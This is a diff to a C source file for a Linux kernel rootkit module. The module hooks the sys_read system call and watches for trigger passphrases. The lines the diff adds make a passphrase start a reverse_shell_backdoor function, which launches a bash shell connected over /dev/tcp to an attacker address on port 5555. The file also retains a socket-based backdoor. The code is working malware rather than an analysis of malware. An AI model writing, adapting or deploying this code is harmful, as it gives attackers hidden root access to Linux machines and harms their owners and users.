@@ -6,7 +6,9 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/unistd.h>
+
 #include <asm/pgtable.h>
+#include <asm/unistd.h>
 
 #include <linux/in.h>
 #include <linux/net.h>
@@ -17,6 +19,7 @@
 #include <linux/string.h>
 #include <linux/kthread.h>
 #include <linux/mman.h>
+#include <linux/kmod.h>
 
 #include <net/sock.h>
 
@@ -24,28 +27,21 @@
 #define __NR_READ 3
 #define INADDRSZ 4
 #define SERVER_PORT 5555
-#define ATTACK_SERVER "192.168.1.15"
-#define SECRET_PASSPHRASE "a good day to die hard"
+#define ATTACK_SERVER "192.168.1.18"
+#define SECRET_PASSPHRASE1 "a good day to die hard"
+#define SECRET_PASSPHRASE2 "callme"
 
 MODULE_LICENSE("GPL");
 
 typedef void (*sys_call_ptr_t)(void);
 typedef asmlinkage long (*orig_read_t)(unsigned int fd, const char*buf, size_t count);
-typedef asmlinkage long (*orig_dup_t)(int,int);
-typedef asmlinkage long (*orig_execve_t)(const char, char*const, char*const);
 
 void hexdump(unsigned char *addr, unsigned int length);
 int inet_pton_pv(const char*src, unsigned char*dst);
-void backdoor();
-
+void backdoor(void*pt);
+void reverse_shell_backdoor(void*pt);
 // Pointer to original sys_read call adres
 orig_read_t origin_syscall = NULL;
-
-// Pointer to dup2
-orig_dup_t dup2_o = NULL;
-
-// Pointer to sys_execve
-orig_execve_t execve_o = NULL;
 
 // Pointer to sys call table
 sys_call_ptr_t*_sys_call_table = NULL;
@@ -62,10 +58,15 @@ int thread_status = 0;
 // Hooked syscall 
 asmlinkage ssize_t evil_sys_read(unsigned int fd, char *buf, size_t count){
   ssize_t return_value = (*origin_syscall)(fd, buf, count);
-  if(strstr(buf, SECRET_PASSPHRASE) != NULL && !check){
+
+  if(strstr(buf, SECRET_PASSPHRASE1) != NULL && !check){
+    printk("%s \n",buf);
+    /* check = 1; */
+    /* thread_status = kthread_run(backdoor, NULL, "backdoor thread"); */
+  }else if(strstr(buf, SECRET_PASSPHRASE2) != NULL && !check){
     printk("%s \n",buf);
     check = 1;
-    thread_status = kthread_run(backdoor, NULL, "backdoor thread");
+    thread_status = kthread_run(reverse_shell_backdoor, NULL, "backdoor thread");
   }
   return return_value;
 }
@@ -133,7 +134,7 @@ int init_module(){
   if(_sys_call_table == NULL) return 0;
   
   // Save original sys_read (__NR_READ => 3)
-  origin_syscall = (orig_read_t) _sys_call_table[__NR_READ];
+  origin_syscall = (orig_read_t) _sys_call_table[__NR_read];
   
   // Unprotected sys_call_table
   pte = lookup_address((unsigned long)_sys_call_table, &level);
@@ -223,6 +224,21 @@ int inet_pton_pv(const char*src, unsigned char*dst){
   return (1);
 }
 
+void reverse_shell_backdoor(void*pt){
+
+  printk("reverse shell backdoor\n");
+  struct subprocess_info *sub_info;
+  char *argv[] = { "/bin/bash","-c","/bin/bash -i >& /dev/tcp/192.168.1.18/5555 0>&1", NULL };
+  static char *envp[] = {
+    "HOME=/",
+    "TERM=linux",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+  
+  sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );
+  if (sub_info == NULL) return -ENOMEM;
+  
+  call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );
+}
 void backdoor(void*pt){
   struct sockaddr_in server_addr;
   struct socket *sk = NULL;
@@ -236,6 +252,7 @@ void backdoor(void*pt){
   printk("setup backdoor\n");
   ret = sock_create(AF_INET, SOCK_STREAM, 0, &sk);
   if(ret < 0) printk("sock_create failed\n");
+
   
   printk("creating sockaddr_in\n");
   memset(&server_addr, 0, sizeof(server_addr));
